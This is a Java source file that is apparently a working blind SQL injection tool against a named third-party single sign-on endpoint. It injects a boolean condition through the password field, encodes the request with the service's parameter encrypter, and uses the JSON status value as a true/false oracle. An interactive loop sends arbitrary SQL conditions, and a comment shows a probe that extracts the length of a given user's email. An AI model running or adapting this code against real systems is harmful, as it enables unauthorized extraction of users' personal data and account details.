package com.cycrypt;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

import com.cycrypt.http.query.CYParamEncrypter;
import com.cycrypt.http.query.HttpRequester;

public class InjectSQLTest {

	private String preSQL ="user_pk=cyworld@cyworld.com.cn&user_pw=a' or ";
	private HttpRequester requester = new HttpRequester();
	public void injectTest(String sql)
	{
		String fullSQL = preSQL+"( CYID='2001000000' and "+sql+")"+" and '1'='1";
		System.out.println("\n"+sql+":\n"+this.requestAndTest(fullSQL)+"\n");
	}
	
	private boolean requestAndTest(String param)
	{
		//user_pk=cyworld@cyworld.com.cn&user_pw=a' or (CYID='2004102438' and CHAR_LENGTH(EMAIL) =1) and '1'='1
		param =  CYParamEncrypter.encode(param);
		String url = "http://cyworld.ifensi.com/services/sso/check_user.php?param="+param;
		String requestResult = requester.stringResultForURL(url);
		return this.isSQLTrue(requestResult);
	}
	
	private boolean isSQLTrue(String requestResult)
	{
		return requestResult.contains("\"status\":0");
	}
	
	public static void main(String args[]) throws IOException
	{
		BufferedReader buf = new BufferedReader(new InputStreamReader(System.in));
		InjectSQLTest tester = new InjectSQLTest();
		String str = "";
		  while(!str.equals("exit")){
		   str = buf.readLine();
		   tester.injectTest(str);
		  }
		  buf.close();
	}
}
